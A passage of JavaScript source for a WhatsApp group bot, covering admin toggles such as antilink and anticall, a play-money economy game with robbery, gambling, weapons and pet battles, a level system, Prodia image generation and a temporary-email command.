global.antilinkkick = false
await reply('SucessFully Deactivated Antilink-kick.')
}}
break                     

   
case 'antilink-warn': {
  if (!m.isGroup) return reply('ɢʀᴏᴜᴘ ᴏɴʟʏ');
    if (!isBotAdmins) return reply('ʙᴏᴛ ɴᴏᴛ ʏᴇᴛ ᴀᴅᴍɪɴ');
    if (!isAdmins) return reply('ғᴏʀ ɢʀᴏᴜᴘ ᴀᴅᴍɪɴ ᴏɴʟʏ');
if (!args[0]) return m.reply(`Example: ${prefix+command} on/off`)
if (args[0] === 'on') {
global.antilinkwarn = true
await reply('SucessFully Activated Antilink-warn to warn link senders')
} else if (args[0] === 'off') {
global.antilinkwarn = false
await reply('SucessFully Deactivated Antilink-warn.')
}}
break                  


case 'antilink-delete': {
  if (!m.isGroup) return reply('ɢʀᴏᴜᴘ ᴏɴʟʏ');
    if (!isBotAdmins) return reply('ʙᴏᴛ ɴᴏᴛ ʏᴇᴛ ᴀᴅᴍɪɴ');
    if (!isAdmins) return reply('ғᴏʀ ɢʀᴏᴜᴘ ᴀᴅᴍɪɴ ᴏɴʟʏ');
if (!args[0]) return m.reply(`Example: ${prefix+command} on/off`)
if (args[0] === 'on') {
global.antilink = true
await reply('SucessFully Activated Antilink Delete')
} else if (args[0] === 'off') {
global.antilink = false
await reply('SucessFully Deactivated Antilink.')
}}
break                  










  
case 'levelup': {
if (!isCreator) return (`For My Owner Only`) 
if (!args[0]) return m.reply(`Example: ${prefix+command} on/off`)
if (args[0] === 'on') {
global.LEVELUP = true
await reply('SucessFully Activated Auto-Level-Up.')
} else if (args[0] === 'off') {
global.LEVELUP = false
await reply('SucessFully Deactivated Auto-Level-Up.')
}}
break            


case 'level': {
    const user = m.sender;

    // Load user data from JSON
    if (!userLevels[user]) {
        userLevels[user] = { xp: 0, level: 1, role: "Novice" }; // Initialize user data
        saveLevels(userLevels); // Save new user data
    }

    const userData = userLevels[user]; // Get user data

    // Display user stats with tagging
    reply(
        `🌟 *Your Stats:*\n\n` +
        `👤 User: @${user.split("@")[0]}\n` +
        `🔹 *Level:* ${userData.level}\n` +
        `🔸 *Role:* ${userData.role}\n` +
        `📊 *XP:* ${userData.xp}/${userData.level * 100} XP\n\n` +
        `💬 Keep chatting to level up!`,
        { mentions: [user] }
    );
    break;
}



function loadLevels() {
    if (fs.existsSync("./david-cyril/level.json")) {
        const data = fs.readFileSync("./david-cyril/level.json");
        return JSON.parse(data);
    }
    return {}; // Return an empty object if file doesn't exist
}


case 'transfer': {
    const user = m.sender; // Sender
    const recipient = m.mentionedJid?.[0]; // The mentioned user
    const amount = parseInt(args[1]); // The amount to transfer

    // Check if recipient and amount are valid
    if (!recipient || isNaN(amount) || amount <= 0) {
        return reply("❌ Usage: *transfer @user <amount>*\n\nExample: *transfer @1234567890 100*");
    }

    // Initialize sender and recipient data if not present
    if (!economy[user]) economy[user] = { wallet: 0, bank: 0 };
    if (!economy[recipient]) economy[recipient] = { wallet: 0, bank: 0 };

    // Check if sender has enough money
    if (economy[user].wallet < amount) {
        return reply(`❌ @${user.split("@")[0]}, you don't have enough money in your wallet to transfer $${amount}.`, {
            mentions: [user],
        });
    }

    // Perform the transfer
    economy[user].wallet -= amount; // Deduct from sender
    economy[recipient].wallet += amount; // Add to recipient

    // Save the updated economy data
    saveEconomy(economy);

    // Confirm the transaction
    reply(
        `✅ *Transfer Successful!*\n\n` +
        `💸 @${user.split("@")[0]} transferred $${amount} to @${recipient.split("@")[0]}.\n\n` +
        `📊 *Your Wallet Balance:* $${economy[user].wallet}`,
        {
            mentions: [user, recipient],
        }
    );
    break;
}



case 'rob': {
    const user = m.sender;
    const victim = m.mentionedJid?.[0]; // Mentioned user

    if (!victim) return reply("❌ Usage: *rob @user*");

    if (!economy[user]) economy[user] = { wallet: 0, bank: 0 };
    if (!economy[victim]) economy[victim] = { wallet: 0, bank: 0 };

    if (economy[victim].wallet < 50) {
        return reply(`❌ @${user.split("@")[0]}, the victim doesn't have enough money to rob.`, {
            mentions: [user],
        });
    }

    // Check if the victim has a guard pet
    if (guardPetsData[victim] && guardPetsData[victim].length > 0) {
        const guardPet = guardPetsData[victim][0]; // Use the first guard pet
        const defenseChance = Math.random() * 100;

        if (defenseChance < guardPet.defense) {
            // Guard pet defends successfully
            const fine = Math.floor(Math.random() * economy[user].wallet * 0.3); // Robber loses up to 30% of their wallet
            economy[user].wallet = Math.max(0, economy[user].wallet - fine);
            saveEconomy(economy);

            return reply(
                `🛡️ *Guard Pet Activated!*\n\n@${victim.split("@")[0]}'s *${guardPet.name}* defended their wallet.\n❌ @${user.split("@")[0]}, you lost $${fine} for trying to rob.`,
                { mentions: [user, victim] }
            );
        }
    }

    const chance = Math.random(); // 50% chance to win
    if (chance < 0.5) {
        // Robbery successful
        const stolenAmount = Math.floor(Math.random() * economy[victim].wallet * 0.5); // Steal up to 50% of victim's wallet
        economy[user].wallet += stolenAmount;
        economy[victim].wallet -= stolenAmount;
        saveEconomy(economy);

        reply(`💰 @${user.split("@")[0]}, you successfully robbed $${stolenAmount} from @${victim.split("@")[0]}!`, {
            mentions: [user, victim],
        });
    } else {
        // Robbery failed
        const fine = Math.floor(Math.random() * economy[user].wallet * 0.3); // Robber loses up to 30% of wallet
        economy[user].wallet = Math.max(0, economy[user].wallet - fine);
        saveEconomy(economy);

        reply(`❌ @${user.split("@")[0]}, robbery failed! You lost $${fine}.`, {
            mentions: [user],
        });
    }
    break;
}



case 'gamble': {
    const user = m.sender;
    const betAmount = parseInt(args[0]); // Amount to bet

    // Validate the bet amount
    if (!betAmount || isNaN(betAmount) || betAmount <= 0) {
        return reply("❌ Usage: *gamble <amount>*\n\nExample: *gamble 100*");
    }

    // Initialize user data if not present
    if (!economy[user]) economy[user] = { wallet: 0, bank: 0 };

    // Check if the user has enough money in their wallet
    if (economy[user].wallet < betAmount) {
        return reply(`❌ @${user.split("@")[0]}, you don't have enough money in your wallet to bet $${betAmount}.`, {
            mentions: [user],
        });
    }

    // 50/50 chance to win or lose
    const win = Math.random() < 0.5; // True for win, False for lose

    if (win) {
        // Winning: Double the bet amount
        const winnings = betAmount * 2;
        economy[user].wallet += winnings; // Add winnings to wallet
        saveEconomy(economy);

        reply(`🎉 *You Win!*\n\n@${user.split("@")[0]}, you bet $${betAmount} and won $${winnings}!\n\n💰 *Wallet Balance:* $${economy[user].wallet}`, {
            mentions: [user],
        });
    } else {
        // Losing: Deduct the bet amount
        economy[user].wallet -= betAmount; // Deduct bet from wallet
        saveEconomy(economy);

        reply(`😢 *You Lose!*\n\n@${user.split("@")[0]}, you bet $${betAmount} and lost it all.\n\n💰 *Wallet Balance:* $${economy[user].wallet}`, {
            mentions: [user],
        });
    }
    break;
}

case 'shop': {
    const items = [
        { name: "Golden Badge", price: 100 },
        { name: "VIP Access", price: 500 },
        { name: "Exclusive Sticker", price: 200 },
    ];

    const shopList = items
        .map((item, index) => `${index + 1}. ${item.name} - $${item.price}`)
        .join("\n");

    reply(`🛒 *Shop Items:*\n\n${shopList}\n\nUse *buy <item_number>* to purchase an item.`);
    break;
}





case 'lottery': {
    reply(`🎟️ *Lottery Info:*\n\n💰 Pot: $${lotteryPot}\n🧑‍🤝‍🧑 Participants: ${lotteryParticipants.length}\n\nUse *buyticket* to enter the lottery!`);
    break;
}

case 'buyticket': {
    const ticketPrice = 100;
    const user = m.sender;

    if (!economy[user]) economy[user] = { wallet: 0, bank: 0 };
    if (economy[user].wallet < ticketPrice) {
        return reply(`❌ @${user.split("@")[0]}, you need $${ticketPrice} to buy a lottery ticket.`, {
            mentions: [user],
        });
    }

    economy[user].wallet -= ticketPrice;
    lotteryPot += ticketPrice;
    lotteryParticipants.push(user);
    saveEconomy(economy);

    reply(`✅ @${user.split("@")[0]}, you entered the lottery!\n\n💰 *Wallet Balance:* $${economy[user].wallet}`, {
        mentions: [user],
    });
    break;
}




case 'buy': {
    const itemIndex = parseInt(args[0]) - 1;
    const items = [
        { name: "Golden Badge", price: 100 },
        { name: "VIP Access", price: 500 },
        { name: "Exclusive Sticker", price: 200 },
    ];

    if (isNaN(itemIndex) || itemIndex < 0 || itemIndex >= items.length) {
        return reply("❌ Invalid item number. Use the *shop* command to see available items.");
    }

    const user = m.sender;
    if (!economy[user]) economy[user] = { wallet: 0, bank: 0 };

    const selectedItem = items[itemIndex];
    if (economy[user].wallet < selectedItem.price) {
        return reply(`❌ @${user.split("@")[0]}, you don't have enough money to buy ${selectedItem.name}.`, {
            mentions: [user],
        });
    }

    economy[user].wallet -= selectedItem.price;
    saveEconomy(economy);

    reply(`✅ @${user.split("@")[0]}, you purchased *${selectedItem.name}* for $${selectedItem.price}!\n\n💰 *Wallet Balance:* $${economy[user].wallet}`, {
        mentions: [user],
    });
    break;
}


case 'shop': {
    const items = [
        { name: "Golden Badge", price: 100 },
        { name: "VIP Access", price: 500 },
        { name: "Exclusive Sticker", price: 200 },
    ];

    const shopList = items
        .map((item, index) => `${index + 1}. ${item.name} - $${item.price}`)
        .join("\n");

    reply(`🛒 *Shop Items:*\n\n${shopList}\n\nUse *buy <item_number>* to purchase an item.`);
    break;
}

case 'buy': {
    const itemIndex = parseInt(args[0]) - 1;
    const items = [
        { name: "Golden Badge", price: 100 },
        { name: "VIP Access", price: 500 },
        { name: "Exclusive Sticker", price: 200 },
    ];

    if (isNaN(itemIndex) || itemIndex < 0 || itemIndex >= items.length) {
        return reply("❌ Invalid item number. Use the *shop* command to see available items.");
    }

    const user = m.sender;
    if (!economy[user]) economy[user] = { wallet: 0, bank: 0 };

    const selectedItem = items[itemIndex];
    if (economy[user].wallet < selectedItem.price) {
        return reply(`❌ @${user.split("@")[0]}, you don't have enough money to buy ${selectedItem.name}.`, {
            mentions: [user],
        });
    }

    economy[user].wallet -= selectedItem.price;
    saveEconomy(economy);

    reply(`✅ @${user.split("@")[0]}, you purchased *${selectedItem.name}* for $${selectedItem.price}!\n\n💰 *Wallet Balance:* $${economy[user].wallet}`, {
        mentions: [user],
    });
    break;
}
   
            
                     
                                       
            
case 'autorecording': {
if (!isCreator) return (`For My Owner Only`) 
if (!args[0]) return m.reply(`Example: ${prefix+command} on/off`)
if (args[0] === 'on') {
global.autoRecord = true
await reply('SucessFully Activated Autorecording.')
} else if (args[0] === 'off') {
global.autoRecord = false
await reply('SucessFully Deactivated Autorecording.')
}}
break            


case 'anticall': {
if (!isCreator) return (`For My Owner Only`) 
if (!args[0]) return m.reply(`Example: ${prefix+command} on/off`)
if (args[0] === 'on') {
global.ANTICALL = true
await reply('SucessFully Activated Anticall.')
} else if (args[0] === 'off') {
global.ANTICALL = false
await reply('SucessFully Deactivated Anticall.')
}}
break            


case 'welcome': {
if (!isCreator) return (`For My Owner Only`) 
if (!args[0]) return m.reply(`Example: ${prefix+command} on/off`)
if (args[0] === 'on') {
global.WELCOME = true
await reply('SucessFully Activated Welcome & GoodBye Message.')
} else if (args[0] === 'off') {
global.WELCOME = false
await reply('SucessFully Deactivated Welcome & GoodBye Message.')
}}
break            


case 'autostatus-react': {
if (!isCreator) return (`For My Owner Only`) 
if (!args[0]) return m.reply(`Example: ${prefix+command} on/off`)
if (args[0] === 'on') {
global.AUTOSTATUS_REACT = true
await reply('SucessFully Activated Autostatus-React.')
} else if (args[0] === 'off') {
global.AUTOSTATUS_REACT = false
await reply('SucessFully Deactivated Autostatus-React.')
}}
break            




case 'antidelete': {
if (!isCreator) return (`For My Owner Only`) 
if (!args[0]) return m.reply(`Example: ${prefix+command} on/off`)
if (args[0] === 'on') {
global.ANTIDELETE = true
await reply('SucessFully Activated Anti-Delete.')
} else if (args[0] === 'off') {
global.ANTIDELETE = false
await reply('SucessFully Deactivated Anti-Delete.')
}}
break            





case 'chatbot': {
if (!isCreator) return (`For My Owner Only`) 
if (!args[0]) return m.reply(`Example: ${prefix+command} on/off`)
if (args[0] === 'on') {
global.chatbot = true
await reply('SucessFully Activated Chatbot.')
} else if (args[0] === 'off') {
global.chatbot = false
await reply('SucessFully Deactivated ChatBot.')
}}
break             




case 'welcome': {
    if (!m.isGroup) return reply('ɢʀᴏᴜᴘ ᴏɴʟʏ');
    if (!isBotAdmins) return reply('ʙᴏᴛ ɴᴏᴛ ʏᴇᴛ ᴀᴅᴍɪɴ');
    if (!isAdmins) return reply('ғᴏʀ ɢʀᴏᴜᴘ ᴀᴅᴍɪɴ ᴏɴʟʏ');
    if (!args[0]) return m.reply(`Example: ${prefix+command} on/off`)
if (args[0] === 'on') {
global.welcome = true
await reply('SucessFully Activated Welcome Message.')
} else if (args[0] === 'off') {
global.welcome = false
await reply('SucessFully Deactivated Welcome Message.')
}}
break            


case 'autotyping': {
if (!isCreator) return (`For My Owner Only`) 
if (!args[0]) return m.reply(`Example: ${prefix+command} on/off`)
if (args[0] === 'on') {
global.autoTyping = true
await reply('SucessFully Activated AutoTyping.')
} else if (args[0] === 'off') {
global.autoTyping = false
await reply('SucessFully Deactivated AutoTyping.')
}}
break            

case 'autoreact': {
if (!isCreator) return (`For My Owner Only`) 
if (!args[0]) return m.reply(`Example: ${prefix+command} on/off`)
if (args[0] === 'on') {
global.autoreact = true
await reply('SucessFully Activated AutoReact.')
} else if (args[0] === 'off') {
global.autoreact = false
await reply('SucessFully Deactivated AutoReact.')
}}
break             


case 'alwaysonline': {
if (!isCreator) return (`For My Owner Only`) 
if (!args[0]) return m.reply(`Example: ${prefix+command} on/off`)
if (args[0] === 'on') {
global.available = true
await reply('SucessFully Activated Alwaysonline.')
} else if (args[0] === 'off') {
global.available = false
await reply('SucessFully Deactivated Alwaysonline.')
}}
break             




case 'wallet': {
    const user = m.sender;

    // Initialize the user data if not present
    if (!economy[user]) economy[user] = { wallet: 0, bank: 0 }; // Default wallet and bank balance
    saveEconomy(economy);

    // Display the wallet balance with tagging
    reply(`💰 *Wallet Balance:*\n@${user.split("@")[0]}, you have $${economy[user].wallet} in your wallet.`, {
        mentions: [user],
    });
    break;
}



case 'bank': {
    const user = m.sender;

    // Initialize the user data if not present
    if (!economy[user]) economy[user] = { wallet: 0, bank: 0 }; // Default wallet and bank balance
    saveEconomy(economy);

    // Display the bank balance with tagging
    reply(`🏦 *Bank Balance:*\n@${user.split("@")[0]}, you have $${economy[user].bank} in your bank.`, {
        mentions: [user],
    });
    break;
}


case 'daily': {
    const user = m.sender;

    // Initialize user data if not present
    if (!economy[user]) {
        economy[user] = { wallet: 0, bank: 0, lastDaily: 0 };
    }

    const now = Date.now();

    // Check if the user has already claimed the daily reward within 24 hours
    if (now - economy[user].lastDaily < 24 * 60 * 60 * 1000) {
        const remaining = 24 * 60 * 60 * 1000 - (now - economy[user].lastDaily);
        const hours = Math.floor(remaining / (60 * 60 * 1000));
        const minutes = Math.floor((remaining % (60 * 60 * 1000)) / (60 * 1000));
        return reply(`⏳ @${user.split("@")[0]}, you've already claimed your daily reward. Try again in ${hours}h ${minutes}m.`, {
            mentions: [user],
        });
    }

    // Generate a random daily reward (100 to 600)
    const reward = Math.floor(Math.random() * 500) + 100;

    // Add the reward to the user's wallet and update the lastDaily timestamp
    economy[user].wallet += reward;
    economy[user].lastDaily = now;

    // Save updated economy data
    saveEconomy(economy);

    // Notify the user of their updated balance
    reply(`🎁 *Daily Reward:*\n@${user.split("@")[0]}, you received $${reward}!\n\n💰 Wallet Balance: $${economy[user].wallet}`, {
        mentions: [user],
    });
    break;
}


case 'attack': {
    const user = m.sender;
    const victim = m.mentionedJid?.[0];
    const weaponIndex = parseInt(args[1]) - 1;

    if (!victim || isNaN(weaponIndex)) {
        return reply("❌ Usage: *attack @user <weapon_number>*\n\nExample: *attack @1234567890 1*");
    }

    if (!guardPetsData[victim] || guardPetsData[victim].length === 0) {
        return reply(`❌ @${victim.split("@")[0]} doesn't have any guards to attack.`, {
            mentions: [victim],
        });
    }

    if (!weaponsData[user] || weaponIndex < 0 || weaponIndex >= weaponsData[user].length) {
        return reply(`❌ @${user.split("@")[0]}, you don't have the selected weapon. Use *myweapons* to see your weapons.`, {
            mentions: [user],
        });
    }

    const weapon = weaponsData[user][weaponIndex];
    const guardPet = guardPetsData[victim][0]; // Target the first guard pet
    const attackChance = weapon.power - guardPet.defense + Math.random() * 50; // Dynamic chance calculation

    if (attackChance > 50) {
        // Attack successful
        guardPetsData[victim].shift(); // Remove the guard pet
        weaponsData[user].splice(weaponIndex, 1); // Weapon is used up
        saveWeapons(weaponsData);
        saveGuardPets(guardPetsData);

        reply(
            `💥 @${user.split("@")[0]}, your *${weapon.name}* successfully killed @${victim.split("@")[0]}'s *${guardPet.name}*!\n\n🔫 Weapon Used: *${weapon.name}*`,
            { mentions: [user, victim] }
        );
    } else {
        // Attack failed
        weaponsData[user].splice(weaponIndex, 1); // Weapon is used up
        saveWeapons(weaponsData);

        reply(
            `❌ @${user.split("@")[0]}, your attack on @${victim.split("@")[0]}'s *${guardPet.name}* failed.\n🔫 Weapon Used: *${weapon.name}*`,
            { mentions: [user, victim] }
        );
    }
    break;
}


case 'buyweapon': {
    const user = m.sender;
    const weapons = [
        { name: "Knife", price: 200000, power: 25 },
        { name: "Pistol", price: 500000, power: 50 },
        { name: "Shotgun", price: 1000000, power: 75 },
        { name: "RPG", price: 2500000, power: 100 }
    ];

    const shopList = weapons.map((weapon, index) => `${index + 1}. ${weapon.name} - $${weapon.price}`).join("\n");

    if (!args[0]) {
        return reply(
            `🔫 *Weapons Shop:*\n\n${shopList}\n\nUse *buyweapon <number>* to purchase a weapon.\nExample: *buyweapon 3*`
        );
    }

    const weaponIndex = parseInt(args[0]) - 1;
    if (isNaN(weaponIndex) || weaponIndex < 0 || weaponIndex >= weapons.length) {
        return reply("❌ Invalid option. Use *buyweapon* to see available weapons.");
    }

    const selectedWeapon = weapons[weaponIndex];

    if (!economy[user]) economy[user] = { wallet: 0, bank: 0 };
    if (economy[user].wallet < selectedWeapon.price) {
        return reply(`❌ @${user.split("@")[0]}, you don't have enough money to buy ${selectedWeapon.name}.`, {
            mentions: [user],
        });
    }

    if (!weaponsData[user]) weaponsData[user] = [];
    weaponsData[user].push({ name: selectedWeapon.name, power: selectedWeapon.power });

    economy[user].wallet -= selectedWeapon.price;
    saveEconomy(economy);
    saveWeapons(weaponsData);

    reply(
        `✅ @${user.split("@")[0]}, you purchased a *${selectedWeapon.name}* for $${selectedWeapon.price}!\n\n💰 *Wallet Balance:* $${economy[user].wallet}`,
        { mentions: [user] }
    );
    break;
}


case 'withdraw': {
    const user = m.sender;
    const amount = parseInt(args[0]);

    if (!economy[user]) economy[user] = { wallet: 0, bank: 0 };
    const bankBalance = economy[user].bank;

    if (!amount || isNaN(amount) || amount <= 0) {
        return reply(`❌ Usage: *withdraw <amount>*\n\nExample: *withdraw 50000*`);
    }

    if (bankBalance < amount) {
        return reply(`❌ @${user.split("@")[0]}, you don't have $${amount} in your bank to withdraw.\n\n🏦 *Bank Balance:* $${bankBalance}`, {
            mentions: [user],
        });
    }

    // Notify the user of withdrawal
    reply(`⏳ @${user.split("@")[0]}, withdrawing $${amount} from your bank, please wait...`, {
        mentions: [user],
    });

    // Delay before transferring the money
    setTimeout(() => {
        economy[user].wallet += amount;
        economy[user].bank -= amount;
        saveEconomy(economy);

        reply(`✅ @${user.split("@")[0]}, you successfully withdrew $${amount} from your bank account.\n\n💰 *Wallet Balance:* $${economy[user].wallet}\n🏦 *Bank Balance:* $${economy[user].bank}`, {
            mentions: [user],
        });
    }, 3000); // 3-second delay for realism
    break;
}




case 'deposit': {
    const user = m.sender;

    if (!economy[user]) economy[user] = { wallet: 0, bank: 0 };
    const walletBalance = economy[user].wallet;

    if (walletBalance <= 0) {
        return reply(`❌ @${user.split("@")[0]}, you don't have any money in your wallet to deposit.`, {
            mentions: [user],
        });
    }

    // Move all wallet money to the bank
    economy[user].bank += walletBalance;
    economy[user].wallet = 0;
    saveEconomy(economy);

    reply(`🏦 @${user.split("@")[0]}, you successfully deposited $${walletBalance} into your bank account.\n\n💰 *Wallet Balance:* $${economy[user].wallet}\n🏦 *Bank Balance:* $${economy[user].bank}`, {
        mentions: [user],
    });
    break;
}

    


case 'myweapons': {
    const user = m.sender;

    if (!weaponsData[user] || weaponsData[user].length === 0) {
        return reply(`❌ @${user.split("@")[0]}, you don't have any weapons. Use *buyweapon* to get one!`, {
            mentions: [user],
        });
    }

    const userWeapons = weaponsData[user]
        .map((weapon, index) => `${index + 1}. *${weapon.name}* - Power: ${weapon.power}`)
        .join("\n");

    reply(`🔫 *Your Weapons:*\n\n${userWeapons}`, { mentions: [user] });
    break;
}



case 'leaderboard': {
    // Sort users by level and XP
    const sortedUsers = Object.entries(userLevels)
        .sort(([, a], [, b]) => b.level - a.level || b.xp - a.xp)
        .slice(0, 5); // Get the top 5 users

    if (sortedUsers.length === 0) {
        return reply("🏆 No users found on the leaderboard yet. Start chatting to get ranked!");
    }

    // Generate leaderboard message
    const leaderboard = sortedUsers
        .map(
            ([id, data], index) =>
                `${index + 1}. @${id.split("@")[0]} - Level ${data.level} (${data.role}), ${data.xp}/${data.level * 100} XP`
        )
        .join("\n");

    reply(`🏆 *Leaderboard:*\n\n${leaderboard}`, {
        mentions: sortedUsers.map(([id]) => id),
    });
    break;
}

case 'buyguard': {
    const user = m.sender;
    const guardPets = [
        { name: "Dog", price: 100000, defense: 50 },
        { name: "Eagle", price: 200000, defense: 75 },
        { name: "Dragon", price: 500000, defense: 100 },
        { name: "Security Bot", price: 1000000, defense: 150 },
        { name: "Armed Guards", price: 2000000, defense: 200 }
    ];

    const shopList = guardPets.map((pet, index) => `${index + 1}. ${pet.name} - $${pet.price}`).join("\n");

    if (!args[0]) {
        return reply(
            `🛡️ *Guard Pet Shop:*\n\n${shopList}\n\nUse *buyguard <number>* to purchase a guard.\nExample: *buyguard 3*`
        );
    }

    const petIndex = parseInt(args[0]) - 1;
    if (isNaN(petIndex) || petIndex < 0 || petIndex >= guardPets.length) {
        return reply("❌ Invalid option. Use *buyguard* to see available guards.");
    }

    const selectedPet = guardPets[petIndex];

    if (!economy[user]) economy[user] = { wallet: 0, bank: 0 };
    if (economy[user].wallet < selectedPet.price) {
        return reply(`❌ @${user.split("@")[0]}, you don't have enough money to buy ${selectedPet.name}.`, {
            mentions: [user],
        });
    }

    // Replace the current guard pet with the new one
    guardPetsData[user] = [{ name: selectedPet.name, defense: selectedPet.defense }];

    economy[user].wallet -= selectedPet.price;
    saveEconomy(economy);
    saveGuardPets(guardPetsData);

    reply(
        `✅ @${user.split("@")[0]}, you purchased *${selectedPet.name}* for $${selectedPet.price}!\n\n💰 *Wallet Balance:* $${economy[user].wallet}*`,
        { mentions: [user] }
    );
    break;
}






case 'buypet': {
    const user = m.sender;
    const petTypes = [
        { name: "Cat", price: 300, strength: 10 },
        { name: "Dog", price: 500, strength: 20 },
        { name: "Dragon", price: 1000, strength: 50 },
    ];

    const petShop = petTypes.map((pet, index) => `${index + 1}. ${pet.name} - $${pet.price}`).join("\n");

    if (!args[0]) {
        return reply(
            `🛒 *Pet Shop:*\n\n${petShop}\n\nUse *buypet <number>* to buy a pet.\nExample: *buypet 2*`
        );
    }

    const petIndex = parseInt(args[0]) - 1;
    if (isNaN(petIndex) || petIndex < 0 || petIndex >= petTypes.length) {
        return reply("❌ Invalid pet number. Use the *buypet* command to see available pets.");
    }

    const selectedPet = petTypes[petIndex];

    if (!economy[user]) economy[user] = { wallet: 0, bank: 0 };
    if (economy[user].wallet < selectedPet.price) {
        return reply(`❌ @${user.split("@")[0]}, you don't have enough money to buy ${selectedPet.name}.`, {
            mentions: [user],
        });
    }

    if (!pets[user]) pets[user] = [];
    pets[user].push({ name: selectedPet.name, level: 1, strength: selectedPet.strength });

    economy[user].wallet -= selectedPet.price;
    saveEconomy(economy);
    savePets(pets);

    reply(
        `✅ @${user.split("@")[0]}, you purchased a *${selectedPet.name}* for $${selectedPet.price}!\n\n💰 *Wallet Balance:* $${economy[user].wallet}`,
        { mentions: [user] }
    );
    break;
}

case 'mypet': {
    const user = m.sender;

    if (!pets[user] || pets[user].length === 0) {
        return reply(`❌ @${user.split("@")[0]}, you don't have any pets. Use *buypet* to get one!`, {
            mentions: [user],
        });
    }

    const userPets = pets[user]
        .map(
            (pet, index) =>
                `${index + 1}. *${pet.name}* - Level ${pet.level}, Strength ${pet.strength}`
        )
        .join("\n");

    reply(`🐾 *Your Pets:*\n\n${userPets}`, { mentions: [user] });
    break;
}


case 'train': {
    const user = m.sender;

    if (!pets[user] || pets[user].length === 0) {
        return reply(`❌ @${user.split("@")[0]}, you don't have any pets. Use *buypet* to get one!`, {
            mentions: [user],
        });
    }

    const petIndex = parseInt(args[0]) - 1;
    if (isNaN(petIndex) || petIndex < 0 || petIndex >= pets[user].length) {
        return reply(`❌ Invalid pet number. Use *mypet* to see your pets.`);
    }

    const selectedPet = pets[user][petIndex];
    const trainingCost = selectedPet.level * 50;

    if (!economy[user]) economy[user] = { wallet: 0, bank: 0 };
    if (economy[user].wallet < trainingCost) {
        return reply(
            `❌ @${user.split("@")[0]}, you need $${trainingCost} to train your pet (${selectedPet.name}).`,
            { mentions: [user] }
        );
    }

    economy[user].wallet -= trainingCost;
    selectedPet.level++;
    selectedPet.strength += 5; // Increase strength per level
    saveEconomy(economy);
    savePets(pets);

    reply(
        `🎉 @${user.split("@")[0]}, your *${selectedPet.name}* leveled up to Level ${selectedPet.level}!\n💪 Strength increased to ${selectedPet.strength}.\n\n💰 *Wallet Balance:* $${economy[user].wallet}`,
        { mentions: [user] }
    );
    break;
}



case 'battle': {
    const opponent = m.mentionedJid?.[0];
    const user = m.sender;

    if (!opponent || opponent === user) {
        return reply("❌ Usage: *battle @user*");
    }

    if (!pets[user] || pets[user].length === 0) {
        return reply(`❌ @${user.split("@")[0]}, you don't have any pets. Use *buypet* to get one!`, {
            mentions: [user],
        });
    }

    if (!pets[opponent] || pets[opponent].length === 0) {
        return reply(`❌ @${opponent.split("@")[0]} doesn't have any pets to battle!`, {
            mentions: [opponent],
        });
    }

    const userPet = pets[user][0]; // Use the first pet for now
    const opponentPet = pets[opponent][0]; // Use the first pet for now

    const userScore = userPet.level + userPet.strength + Math.random() * 10;
    const opponentScore = opponentPet.level + opponentPet.strength + Math.random() * 10;

    if (userScore > opponentScore) {
        reply(
            `🏆 *Battle Result:*\n\n🎉 @${user.split("@")[0]}'s *${userPet.name}* defeated @${opponent.split("@")[0]}'s *${opponentPet.name}*!`,
            { mentions: [user, opponent] }
        );
    } else {
        reply(
            `🏆 *Battle Result:*\n\n🎉 @${opponent.split("@")[0]}'s *${opponentPet.name}* defeated @${user.split("@")[0]}'s *${userPet.name}*!`,
            { mentions: [user, opponent] }
        );
    }
    break;
}




            
case 'unavailable': {
if (!isCreator) return (`For My Owner Only`) 
if (!args[0]) return m.reply(`Example: ${prefix+command} on/off`)
if (args[0] === 'on') {
global.unavailable = true
await reply('SucessFully Activated Unavailable')
} else if (args[0] === 'off') {
global.unavailable = false
await reply('SucessFully Deactivated Unavailable.')
}}
break                      
         
case 'autoread': {
if (!isCreator) return (`For My Owner Only`) 
if (!args[0]) return m.reply(`Example: ${prefix+command} on/off`)
if (args[0] === 'on') {
global.autoreadmessages = true
await reply('SucessFully Activated Autoread')
} else if (args[0] === 'off') {
global.autoreadmessages = false
await reply('SucessFully Deactivated Autoread.')
}}
break              


// Temporary Email Feature













case 'kisahnabi': {
if (!text) return reply("nama nabinya?")
let url = await fetch(`https://raw.githubusercontent.com/ZeroChanBot/Api-Freee/a9da6483809a1fbf164cdf1dfbfc6a17f2814577/data/kisahNabi/${text}.json`)
     let kisah = await url.json().catch(_ => "Error")
     if (kisah == "Error") return reply("*Not Found*\n*Try Not to Use Capital Letters*")
     
     let hasil = `_*Name of the Prophet :*_ ${kisah.name} 
_*Date of birth :*_ ${kisah.thn_kelahiran}
_*Place of birth :*_ ${kisah.tmp}
_*Age :*_ ${kisah.usia}

* — [ K I S A H ] — *

${kisah.description}`

     reply(hasil)
}
break

 case 'prodia': {
if (!q) return m.reply(`query?`)
    async function prodia(query) {
        const headers = { // wm avz
            'user-agent': 'Mozilla/5.0 (Linux; Android 11; Avosky) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Mobile Safari/537.36'
        };
        try {            // wm avz
            const AvoskyX = await axios.get('https://api.prodia.com/generate', {
                params: {
                    "new": "true",
                    "prompt": query,
                    "model": "dreamshaper_6BakedVae.safetensors [114c8abb]",
                    "steps": "50",
                    "cfg": "9.5",
                    "seed": Math.floor(Math.random() * 10000) + 1,
                    "sampler": "Euler",
                    "aspect_ratio": "square"
                }, // wm avz
                headers,
                timeout: 30000
            });
            const avos = AvoskyX.data;
            let AvoskyNih;
            do {
                const syra = await axios.get(`https://api.prodia.com/job/${avos.job}`, { headers });
                AvoskyNih = syra.data;
            } while (AvoskyNih.status !== 'succeeded');
            const imageUrl = `https://images.prodia.xyz/${avos.job}.png?download=1`;
            David.sendMessage(m.chat, { image: { url: imageUrl }, caption: '_donee_.' });
        } catch (error) {
            m.reply('Errorl');
        }
    }    
    prodia(`${q}`);
}
// wm avz
break





// Create Temporary Email
case "tempmail":
case "tmpmail":
case "newmail": {
    if (!tempMailData[m.sender]) {
        try {
            // Generate a random email using 1SecMail API
            const response = await axios.get('https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1');
            const data = response.data[0];

            if (!data) {
                return reply("Failed to generate a temporary email. Please try again.");
            }

            // Save the generated email and session ID for the user
            tempMailData[m.sender] = { email: data, id: data.sid };
            reply(`*Temporary Email Created:*\n\n📧 Email: ${data}\n\nUse *${prefix}checkmail* to check your inbox.\nUse *${prefix}delmail* to delete your email.`);
        } catch (error) {
            console.error(error);
            reply("An error occurred while creating a temporary email. Please try again.");
        }
    } else {
